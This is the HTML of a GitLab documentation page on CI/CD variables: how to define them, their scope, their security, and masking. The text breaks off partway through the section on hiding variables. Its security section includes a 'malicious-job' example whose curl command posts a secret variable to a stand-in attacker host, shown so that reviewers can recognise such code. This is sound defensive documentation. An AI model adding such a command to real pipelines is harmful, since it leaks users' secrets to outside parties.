<!doctype html><html lang=en-us dir=ltr><head><script src=https://cdn.cookielaw.org/consent/7f944245-c5cd-4eed-a90e-dd955adfdd08/OtAutoBlock.js></script><script src=https://cdn.cookielaw.org/scripttemplates/otSDKStub.js data-domain-script=7f944245-c5cd-4eed-a90e-dd955adfdd08></script><script type=text/javascript>function OptanonWrapper(){}</script><script>const callback=(e)=>{for(const t of e)t.type==="childList"&&t.addedNodes.forEach(e=>{e.nodeName==="IMG"&&document.querySelectorAll('img:not([src^="http"]):not([data-ot-ignore])').forEach(e=>{e.setAttribute("data-ot-ignore","")})})},config={attributes:!0,childList:!0,subtree:!0,attributeFilter:["src"]},observer=new MutationObserver(callback);observer.observe(document.documentElement,config)</script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","GTM-NJXWQL"),gtag("consent","default",{analytics_storage:"granted",ad_storage:"granted",functionality_storage:"granted",wait_for_update:500}),gtag("consent","default",{analytics_storage:"denied",ad_storage:"denied",functionality_storage:"denied",region:["AT","BE","BG","HR","CY","CZ","DK","EE","FI","FR","DE","GR","HU","IE","IT","LV","LT","LU","MT","NL","PL","PT","RO","SK","SI","ES","SE","IS","LI","NO","GB","PE","RU"],wait_for_update:500}),window.geofeed=e=>{dataLayer.push({event:"OneTrustCountryLoad",oneTrustCountryId:e.country.toString()})};const json=document.createElement("script");json.setAttribute("src","https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/geofeed"),document.head.appendChild(json)</script><meta charset=utf-8><meta name=viewport content="width=device-width"><title>GitLab CI/CD variables | GitLab Docs</title><link rel=icon href=/favicon.ico sizes=any><link rel=icon href=/favicon.svg type=image/svg+xml><link rel=apple-touch-icon href=/apple-touch-icon.png><link rel=manifest href=/manifests/manifest.webmanifest><meta name=theme-color content="#FC6D26"><link rel=canonical href=https://docs.gitlab.com/ci/variables/><meta name=description content="Configuration, usage, and security."><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebSite","name":"GitLab Docs","url":"https://docs.gitlab.com/"}</script><link rel=preload href=/gitlab_ui/fonts/GitLabSans.woff2 type=font/woff2 as=font crossorigin><link rel=prefetch href=/gitlab_ui/fonts/GitLabSans-Italic.woff2 crossorigin><link rel=prefetch href=/gitlab_ui/fonts/GitLabMono.woff2 crossorigin><link rel=stylesheet href=/gitlab_ui/ui/index.css><link rel=stylesheet href=/vite/main.css><link rel=stylesheet href=/css/syntax-dark.min.css id=syntax-dark-theme><link rel=stylesheet href=/css/syntax-light.min.css id=syntax-light-theme><script>(function(){const p="gitlab-docs-theme",g="gitlab-docs-layout",e={LIGHT:"light",DARK:"dark",AUTO:"auto"},i={FIXED:"fixed",FLUID:"fluid"},d="light",f="fixed";let r=!1;const t=localStorage?.getItem(p),m=localStorage?.getItem(g),l=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?e.DARK:e.LIGHT;function h(){return t&&(t===e.LIGHT||t===e.DARK)?t:(t===e.AUTO&&(r=!0),l||d)}function u(){return m===i.FLUID?i.FLUID:f}const s=h(),c=u(),n=document.documentElement;n.classList.remove("gl-dark","gl-light"),n.classList.add(s===e.DARK?"gl-dark":"gl-light"),c===i.FLUID&&(n.classList.add("fluid"),n.classList.remove("fixed"));const a=document.getElementById("syntax-dark-theme"),o=document.getElementById("syntax-light-theme");a&&o&&(s===e.DARK?(a.disabled=!1,o.disabled=!0):(a.disabled=!0,o.disabled=!1)),window.__initialTheme=r?e.AUTO:s,window.__initialLayout=c})()</script><meta name=gitlab_docs_base_url content="/"><meta name=gitlab_docs_page_owner data-stage=Verify data-group="Pipeline Authoring"><meta class=elastic name=gitlab_docs_version content="18.6"><meta class=elastic name=gitlab_docs_section content="use_gitlab"><meta class=elastic name=gitlab_docs_breadcrumbs content="Use GitLab â€º Use CI/CD to build your application"><script>window.pageMetadata={trail:[{path:"user/",title:"Use GitLab"},{path:"topics/build_your_application/",title:"Use CI/CD to build your application"},{path:"ci/variables/",title:"Variables"}]}</script><meta name=gitlab_docs_legacy_path content="/ee/ci/variables/index.html"><meta name=gitlab_docs_hugo_launch_version content="17.9"><script>const ELASTIC_CLOUD_ID="gitlab-docs-website:dXMtY2VudHJhbDEuZ2NwLmNsb3VkLmVzLmlvJDQwZTQyYTQzMTJiZjQyMzNiMzBiZTg0MTU5YjlkNmE1JGMxODg4Y2U5OTY0YzQzZjc5ZjQ1YTk5NDZmMjI0ODg0",ELASTIC_KEY="cDFpLWJaSUJXVHBqWWI4VGZKN3M6eENBSjl4WDRSRnlCUW94ajRQazhLQQ==",ELASTIC_INDEX="search-gitlab-docs-hugo"</script><script type=module src=/vite/elastic_search.js></script><script type=module src=/vite/history.js></script><script>const FS_IDENTIFIER="AIzaSyCLdi3jHHjkmLji9D8uj_RNPMHcdrYoIW4",RECAPTCHA_PUBLIC_KEY="6Le4R3UrAAAAALsIlK_siq0_UhPD-0rD-ImF1gfO"</script><meta name=google-site-verification content="AcGSBNaKDWnLgcYotlVibGy6STm2Y6_KJSaRxrA90xY"><meta name=google-site-verification content="6eFQOFLxYAer08ROqc3I-SAi44F9NmvH7PrUUBR3oCI"><meta name=google-site-verification content="xAUTWp3CDg-tU1LVVwsM9OrVhLR7L3SmiyKzkOuPNos"><meta name=google-site-verification content="F0zzwaMpiyWFcPQ1Lqu18qN3EnuQsqFXbySl_29yvHs"><meta name=google-site-verification content="nwo1bVaU0t9TZxZyM-aOI6-CofaH9GRL-uBPbdREWgc"><meta name=google-site-verification content="rWoHrtHEmIX0t28oOb1ZEDMYZb_EZA6rr6ZOl5otEPI"><meta name=google-site-verification content="fSxr8-uslxcuFL0N-oECp3Tm0RPNEGX97wbdayKOEL8"><meta name=google-site-verification content="ISxyLVnZqU8oY3jwrK7EO9o-2DOTvLJwPse7bZz6yhs"><meta name=google-site-verification content="x1WspIvz3ZHqS0gezfX_P-qiRDOeP2Oyrd68zrU2ErI"><meta name=google-site-verification content="DfXB2Za52GT3zs_vuLIAL4Mi3M3K4qxXcg7MAs0CUqo"><meta name=google-site-verification content="BCEBC2LC7A1NzO9Com1oBrWK88tV_QXfUL0i9mwXPL0"><meta name=google-site-verification content="a2lNcHMorfS43aoISjZt5_BBPo-H1UaTKMQdBgZO9iY"><meta name=google-site-verification content="0s16pP9MelY6wDHRf-izXb5pwLU01IogP-Uc_e8f3GU"><meta name=google-site-verification content="H474RNof35Xp8fLg02fZbg9Dzxdtfch6vtcjzpmUraU"><meta name=google-site-verification content="E0FlhpgBGeE7d1pQ6amdcIWPMDLDeu15-HLQVoDTguE"><meta name=google-site-verification content="opQd7_rXtPy-pX5CO_XZiztzeQEsXnB3j6Y1_dZAizA"><meta name=google-site-verification content="06Kq4AoXdmBOjOAkbPvnYGtSxnn4Q9QBqEO55PLlw5c"><meta name=google-site-verification content="djBBokRFSWV_VRlSE51V5TZSPzMC6hml5l-Sb22WglE"><meta name=google-site-verification content="UOW6nOsvbyMeIySuamzbws4kNC_WqehamWfoxxtKjZ8"><meta name=google-site-verification content="hXU1Gsdba74DUbvbdUHRl9o0cQeiwXIhAdIllOG6p8E"><meta name=google-site-verification content="YFeHIAPk9lE76ubVMeq4P0sQVnzo2-a4k1oU_bPY8yE"><meta name=google-site-verification content="h8ICI4eDkvXmYaGDuLTLoWuXnLn-KUkChqYB-roMRsw"><meta name=google-site-verification content="9QW7feFNlCpMLPm7vAWEU-v14vdzb0Bb3RAk-8e_a18"><meta name=google-site-verification content="26kXLBOjaYRb2UwzWTDl1I1nzA2NxMunhp7SUtxGV6E"><meta name=google-site-verification content="jr3C8t6vKGPyN9GV3esdHY_xGYyQaUNznIl-Un2RObA"><meta name=google-site-verification content="WdlBpRU0ec1ieKqrTY_772OhG23FY45VQ4Lv9DyLJ_Y"><meta name=google-site-verification content="n9i6B9q4Xjr_etK2nQGZH1msoo7vIv9SXV8SQLOUA7c"><meta name=zd-site-verification content="ony3w7hk1vs6tfyrc51mld"><meta name=zd-site-verification content="gtuq65qdzt6n31viazi6hj"></head><body data-elastic-exclude><nav data-ga-section=header data-elastic-exclude><div class="header-wrapper gl-w-full gl-fixed gl-z-4"><div class=header><div class="header-top gl-flex gl-items-center"><a href=#skipTarget class="gl-sr-only skip-link">Skip to main content</a>
<a class=navbar-logo href=/><span class=gl-sr-only>Go to GitLab Docs homepage</span></a><div class="mobile-header gl-w-full gl-text-base"><div class=mobile-header-overlay></div><div class="header-right collapse gl-z-4 gl-border-t lg:gl-border-0"><div class="search-wrapper lg:gl-ml-4 lg:gl-grow"><div class="js-elastic-search-form gl-spinner-container"><span role=status aria-label=Loading class="gl-ml-3 gl-align-text-bottom! gl-spinner gl-spinner gl-spinner-sm"></span></div></div><div class="gl-flex gl-flex-col gl-gap-3 gl-mt-5 lg:gl-mt-0 lg:gl-flex-row lg:gl-items-center gl-ml-auto"><a class="whats-new gl-button btn-default btn-default-tertiary gl-hidden lg:gl-block" href=https://about.gitlab.com/releases/categories/releases/ target=_blank rel="noopener noreferrer">What's new?</a><div data-vue-app=versions-menu></div><div data-vue-app=appearance-toggle class="gl-hidden lg:gl-block"></div><div class="gl-flex gl-justify-evenly lg:gl-justify-normal gl-items-center gl-gap-5"><a class="whats-new gl-button btn-default btn-default-tertiary gl-w-full lg:gl-hidden hover:gl-no-underline" href=https://about.gitlab.com/releases/categories/releases/ target=_blank rel="noopener noreferrer">What's new?</a>
<a class="free-trial-btn cta-button gl-button btn-confirm gl-w-full hover:gl-no-underline" href="https://gitlab.com/-/trial_registrations/new?glm_source=docs.gitlab.com&amp;amp;glm_content=navigation-cta-docs" target=_blank rel="noopener noreferrer" role=button>Get free trial</a></div></div></div></div><button class="navbar-toggle gl-button btn-default lg:gl-hidden" data-toggle=collapse data-target=.header-right>
<span class=navbar-toggle-icon></span>
<span class=gl-sr-only>Toggle menu</span></button></div><div class="header-bottom gl-border-t lg:gl-border-b"><ul class="subheader-menu gl-hidden lg:gl-flex gl-list-none gl-text-base gl-space-x-5 gl-py-4 gl-pl-0 gl-mb-0"><li><a href=/user/ class=active>Use GitLab</a></li><li><a href=/user/gitlab_duo/>GitLab Duo</a></li><li><a href=/api/>Extend</a></li><li><a href=/install/>Install</a></li><li><a href=/administration/>Administer</a></li><li><a href=/subscriptions/>Subscribe</a></li><li><a href=/development/>Contribute</a></li><li><a href=/solutions/>Solutions</a></li></ul></div></div></div></nav><main data-ga-section=content-body><div id=js-version-banner></div><div class="template-single gl-flex gl-h-full"><div class=side-nav data-ga-section=side-nav data-vue-app=sidebar-menu></div><div data-pagefind-body class=main-content><div class=docs-content><div class="gl-flex gl-h-5 gl-items-center gl-my-6"><div data-vue-app=open-sidebar></div><div data-vue-app=breadcrumb-nav></div></div><hr class="gl-border-t gl-px-5 lg:gl-hidden"><div class="gl-pt-4 gl-mt-4 lg:gl-pt-0 lg:gl-mt-0 lg:gl-border-t-0"><h1 id=skipTarget class=gl-mb-6>GitLab CI/CD variables</h1></div><div data-elastic-include><div class="availability gl-pl-4 gl-mb-5"><ul class="gl-list-none gl-p-0 gl-m-0"><li><span class=gl-font-bold>Tier</span>: Free, Premium, Ultimate</li><li><span class=gl-font-bold>Offering</span>: GitLab.com, GitLab Self-Managed, GitLab Dedicated</li></ul></div><p>CI/CD variables are a type of environment variable. You can use them to:</p><ul><li>Control the behavior of jobs and pipelines.</li><li>Store values you want to re-use, for example in <a href=/ci/variables/job_scripts/>job scripts</a>.</li><li>Avoid hard-coding values in your <code>.gitlab-ci.yml</code> file.</li></ul><p>Variable names are limited by the <a href=https://docs.gitlab.com/runner/shells/>shell the runner uses</a>
to execute scripts. Each shell has its own set of reserved variable names.</p><p>To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the <a href=https://docs.ruby-lang.org/en/master/Psych.html>Psych YAML parser</a>,
so quoted and unquoted variables might be parsed differently. For example, <code>VAR1: 012345</code>
is interpreted as an octal value, so the value becomes <code>5349</code>, but <code>VAR1: "012345"</code> is parsed
as a string with a value of <code>012345</code>.</p><p>For more information about advanced use of GitLab CI/CD, see <a href=https://about.gitlab.com/webcast/7cicd-hacks/>7 advanced GitLab CI workflow hacks</a> shared by GitLab engineers.</p><h2 id=predefined-cicd-variables>Predefined CI/CD variables</h2><p>GitLab CI/CD makes a set of <a href=/ci/variables/predefined_variables/>predefined CI/CD variables</a>
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.</p><p>You can use predefined CI/CD variables in your <code>.gitlab-ci.yml</code> without declaring them first.
For example:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>job1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>stage</span><span class=p>:</span><span class=w> </span><span class=l>test</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;The job&#39;s stage is &#39;$CI_JOB_STAGE&#39;&#34;</span></span></span></code></pre></div></div><p>The script in this example outputs <code>The job's stage is 'test'</code>.</p><h2 id=define-a-cicd-variable-in-the-gitlab-ciyml-file>Define a CI/CD variable in the <code>.gitlab-ci.yml</code> file</h2><p>To create a CI/CD variable in the <code>.gitlab-ci.yml</code> file, define the variable and
value with the <a href=/ci/yaml/#variables><code>variables</code></a> keyword.</p><p>Variables saved in the <code>.gitlab-ci.yml</code> file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a <code>DATABASE_URL</code> variable. Sensitive variables containing values
like secrets or keys should be added in the UI.</p><p>You can define <code>variables</code> in:</p><ul><li>A job: The variable is only available in that job&rsquo;s <code>script</code>, <code>before_script</code>, or <code>after_script</code> sections, and with some <a href=/ci/yaml/#job-keywords>job keywords</a>.</li><li>The top-level of the <code>.gitlab-ci.yml</code> file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job&rsquo;s variable takes precedence.</li></ul><p>In both cases, you cannot use these variables with <a href=/ci/yaml/#global-keywords>global keywords</a>.</p><p>For example:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ALL_JOBS_VAR</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;A default variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>job1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>JOB1_VAR</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;Job 1 variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;Variables are &#39;$ALL_JOBS_VAR&#39; and &#39;$JOB1_VAR&#39;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>job2</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ALL_JOBS_VAR</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;Different value than default&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>JOB2_VAR</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;Job 2 variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;Variables are &#39;$ALL_JOBS_VAR&#39;, &#39;$JOB2_VAR&#39;, and &#39;$JOB1_VAR&#39;&#34;</span></span></span></code></pre></div></div><p>In this example:</p><ul><li><code>job1</code> outputs: <code>Variables are 'A default variable' and 'Job 1 variable'</code></li><li><code>job2</code> outputs: <code>Variables are 'Different value than default', 'Job 2 variable', and ''</code></li></ul><p>Use the <code>value</code> and <code>description</code> keywords to define <a href=/ci/pipelines/#prefill-variables-in-manual-pipelines>variables that are prefilled</a>
for manually-triggered pipelines.</p><h3 id=skip-default-variables-in-a-single-job>Skip default variables in a single job</h3><p>If you don&rsquo;t want default variables to be available in a job, set <code>variables</code> to <code>{}</code>:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>DEFAULT_VAR</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;A default variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>job1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>variables</span><span class=p>:</span><span class=w> </span>{}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo This job does not need any variables</span></span></span></code></pre></div></div><h2 id=define-a-cicd-variable-in-the-ui>Define a CI/CD variable in the UI</h2><p>Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not in the <code>.gitlab-ci.yml</code> file.</p><p>By default, pipelines from forked projects can&rsquo;t access the CI/CD variables available to the parent project.
If you <a href=/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project>run a merge request pipeline in the parent project for a merge request from a fork</a>,
all variables become available to the pipeline.</p><h3 id=for-a-project>For a project</h3><p>You can add CI/CD variables to a project&rsquo;s settings. Projects can have a maximum of 8000 CI/CD variables.</p><p>Prerequisites:</p><ul><li>You must be a project member with the Maintainer role.</li></ul><p>To add or update variables in the project settings:</p><ol><li>On the left sidebar, select <strong>Search or go to</strong> and find your project. If you&rsquo;ve <a href=/user/interface_redesign/#turn-new-navigation-on-or-off>turned on the new navigation</a>, this field is on the top bar.</li><li>Select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Select <strong>Add variable</strong> and fill in the details:<ul><li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li><li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
runner&rsquo;s operating system. The value has extra limitations if <strong>Visibility</strong> is set to <strong>Masked</strong>
or <strong>Masked and hidden</strong>.</li><li><strong>Type</strong>: <code>Variable</code> (default) or <a href=/ci/variables/#use-file-type-cicd-variables><code>File</code></a>.</li><li><strong>Environment scope</strong>: Optional. <strong>All (default)</strong> (<code>*</code>), a specific <a href=/ci/environments/>environment</a>,
or a wildcard environment scope.</li><li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
that run on protected branches or protected tags.</li><li><strong>Visibility</strong>: Select <strong>Visible</strong> (default), <strong>Masked</strong>, or <strong>Masked and hidden</strong>.</li><li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li></ul></li></ol><p>Alternatively, project variables can be added <a href=/api/project_level_variables/>by using the API</a>.</p><h3 id=for-a-group>For a group</h3><p>You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.</p><p>Prerequisites:</p><ul><li>You must be a group member with the Owner role.</li></ul><p>To add a group variable:</p><ol><li>On the left sidebar, select <strong>Search or go to</strong> and find your group. If you&rsquo;ve <a href=/user/interface_redesign/#turn-new-navigation-on-or-off>turned on the new navigation</a>, this field is on the top bar.</li><li>Select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Select <strong>Add variable</strong> and fill in the details:<ul><li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li><li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
runner&rsquo;s operating system. The value has extra limitations if <strong>Visibility</strong> is set to <strong>Masked</strong>
or <strong>Masked and hidden</strong>.</li><li><strong>Type</strong>: <code>Variable</code> (default) or <a href=/ci/variables/#use-file-type-cicd-variables><code>File</code></a>.</li><li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
that run on protected branches or protected tags.</li><li><strong>Visibility</strong>: Select <strong>Visible</strong> (default), <strong>Masked</strong>, <strong>Masked and hidden</strong>.</li><li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li></ul></li></ol><p>The group variables that are available in a project are listed in the project&rsquo;s
<strong>Settings > CI/CD > Variables</strong> section. Variables from subgroups are recursively inherited.</p><p>Alternatively, group variables can be added <a href=/api/group_level_variables/>by using the API</a>.</p><h4 id=environment-scope>Environment scope</h4><div class="availability gl-pl-4 gl-mb-5"><ul class="gl-list-none gl-p-0 gl-m-0"><li><span class=gl-font-bold>Tier</span>: Premium, Ultimate</li></ul></div><p>To set a group CI/CD variable to only be available for certain environments:</p><ol><li>On the left sidebar, select <strong>Search or go to</strong> and find your group. If you&rsquo;ve <a href=/user/interface_redesign/#turn-new-navigation-on-or-off>turned on the new navigation</a>, this field is on the top bar.</li><li>Select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>To the right of the variable, select <strong>Edit</strong> (<span> <svg role="img" aria-label="pencil" class="gl-icon s16"><use href="/gitlab_ui/svgs-latest/icons.svg#pencil"/><title>pencil</title></svg> </span>).</li><li>For <strong>Environment scope</strong>, select <strong>All (default)</strong> (<code>*</code>), a specific <a href=/ci/environments/>environment</a>,
or a wildcard environment scope.</li></ol><h3 id=for-an-instance>For an instance</h3><div class="availability gl-pl-4 gl-mb-5"><ul class="gl-list-none gl-p-0 gl-m-0"><li><span class=gl-font-bold>Tier</span>: Free, Premium, Ultimate</li><li><span class=gl-font-bold>Offering</span>: GitLab Self-Managed, GitLab Dedicated</li></ul></div><p>You can make a CI/CD variable available to all projects and groups in a GitLab instance.</p><p>Prerequisites:</p><ul><li>You must have administrator access to the instance.</li></ul><p>To add an instance variable:</p><ol><li>On the left sidebar, at the bottom, select <strong>Admin</strong>. If you&rsquo;ve <a href=/user/interface_redesign/#turn-new-navigation-on-or-off>turned on the new navigation</a>, in the upper-right corner, select <strong>Admin</strong>.</li><li>Select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Select <strong>Add variable</strong> and fill in the details:<ul><li><strong>Key</strong>: Must be one line, with no spaces, using only letters, numbers, or <code>_</code>.</li><li><strong>Value</strong>: The value is limited to 10,000 characters, but also bounded by any limits in the
runner&rsquo;s operating system. No other limitations if <strong>Visibility</strong> set to <strong>Visible</strong>.</li><li><strong>Type</strong>: <code>Variable</code> (default) or <code>File</code>.</li><li><strong>Protect variable</strong> Optional. If selected, the variable is only available in pipelines
that run on protected branches or tags.</li><li><strong>Visibility</strong>: Select <strong>Visible</strong> (default), <strong>Masked</strong>, or <strong>Masked and hidden</strong>.</li><li><strong>Expand variable reference</strong>: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if <strong>Visibility</strong> is set to <strong>Masked</strong> or <strong>Masked and hidden</strong>.</li></ul></li></ol><p>Alternatively, instance variables can be added <a href=/api/instance_level_ci_variables/>by using the API</a>.</p><h2 id=cicd-variable-security>CI/CD variable security</h2><p>Code pushed to the <code>.gitlab-ci.yml</code> file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.</p><p>Review all merge requests that introduce changes to the <code>.gitlab-ci.yml</code> file before you:</p><ul><li><a href=/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project>Run a pipeline in the parent project for a merge request submitted from a forked project</a>.</li><li>Merge the changes.</li></ul><p>Review the <code>.gitlab-ci.yml</code> file of imported projects before you add files or run pipelines against them.</p><p>The following example shows malicious code in a <code>.gitlab-ci.yml</code> file:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>accidental-leak-job</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>                                         </span><span class=c># Password exposed accidentally</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;This script logs into the DB with $USER $PASSWORD&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>db-login $USER $PASSWORD</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>malicious-job</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>                                         </span><span class=c># Secret exposed maliciously</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>curl --request POST --data &#34;secret_variable=$SECRET_VARIABLE&#34; &#34;https://maliciouswebsite.abcd/&#34;</span></span></span></code></pre></div></div><p>To help reduce the risk of accidentally leaking secrets through scripts like in <code>accidental-leak-job</code>,
all variables containing sensitive information should always be masked in job logs.
You can also <a href=/ci/variables/#protect-a-cicd-variable>limit a variable to protected branches and tags only</a>.</p><p>Alternatively, <a href=/ci/secrets/>connect with an external secrets management provider</a>
to store and retrieve secrets.</p><p>Malicious scripts like in <code>malicious-job</code> must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.</p><p>Variable values are encrypted using <a href=https://en.wikipedia.org/wiki/Advanced_Encryption_Standard><code>aes-256-cbc</code></a>
and stored in the database. This data can be read and decrypted with a
valid <a href=/administration/backup_restore/troubleshooting_backup_gitlab/#when-the-secrets-file-is-lost>secrets file</a>.</p><h3 id=mask-a-cicd-variable>Mask a CI/CD variable</h3><div class="alert alert-type-warning gl-rounded-lg"><div class=alert-icon></div><div class=gl-min-w-0><p>Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using <a href=/ci/secrets/>external secrets</a> and <a href=/ci/variables/#use-file-type-cicd-variables>file type variables</a>
to prevent commands such as <code>env</code> or <code>printenv</code> from printing secret variables.</p></div></div><p>You can mask a CI/CD variable for a project, group, or instance to prevent
its value from appearing in job logs. When a job outputs the value of a
masked variable, the value is replaced with <code>[MASKED]</code> in the job log.
In some cases, the <code>[MASKED]</code> value could be followed by <code>x</code> characters as well.</p><p>Prerequisites:</p><ul><li>You must have the same role or access level as required to <a href=/ci/variables/#define-a-cicd-variable-in-the-ui>add a CI/CD variable in the UI</a>.</li></ul><p>To mask a variable:</p><ol><li>For the group, project, or in the <strong>Admin</strong> area, select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Next to the variable you want to protect, select <strong>Edit</strong>.</li><li>Under <strong>Visibility</strong>, select <strong>Mask variable</strong>.</li><li>Recommended. Clear the <a href=/ci/variables/#allow-cicd-variable-expansion><strong>Expand variable reference</strong></a> checkbox.
If variable expansion is enabled, the only non-alphanumeric characters you can use in
the variable value are: <code>_</code>, <code>:</code>, <code>@</code>, <code>-</code>, <code>+</code>, <code>.</code>, <code>~</code>, <code>=</code>, <code>/</code>, and <code>~</code>.
When the setting is disabled, all characters can be used.</li><li>Select <strong>Update variable</strong>.</li></ol><p>The value of the variable must:</p><ul><li>Be a single line with no spaces.</li><li>Be 8 characters or longer.</li><li>Not match the name of an existing predefined or custom CI/CD variable.</li></ul><p>If a process outputs the value in a slightly modified way, the value can&rsquo;t be masked.
For example, if the shell adds <code>\</code> to escape special characters, the value isn&rsquo;t masked:</p><ul><li>Example masked variable value: <code>My[value]</code></li><li>This output would not be masked: <code>My\[value\]</code></li></ul><p>When <code>CI_DEBUG_SERVICES</code> is enabled, the variable value might be revealed. For more information, see
<a href=/ci/services/#capturing-service-container-logs>service container logging</a>.</p><h3 id=hide-a-cicd-variable>Hide a CI/CD variable</h3><div class="collapsible-section gl-my-5"><button class="gl-align-middle gl-text-left gl-border-0 gl-pl-0" type=button aria-expanded=false aria-controls=collapsible-5 aria-label="Toggle section" data-toggle=collapse data-target=#collapsible-5>History<span class="gl-ml-2 icon"></span></button><div id=collapsible-5 class="collapsible-list collapse" aria-hidden=true><ul><li><a href=https://gitlab.com/gitlab-org/gitlab/-/issues/29674>Introduced</a> in GitLab 17.4 <a href=/administration/feature_flags/>with a flag</a> named <code>ci_hidden_variables</code>. Enabled by default.</li><li><a href=https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843>Generally available</a> in GitLab 17.6. Feature flag <code>ci_hidden_variables</code> removed.</li></ul></div></div><p>In addition to masking, you can also prevent the value of CI/CD variables from being revealed
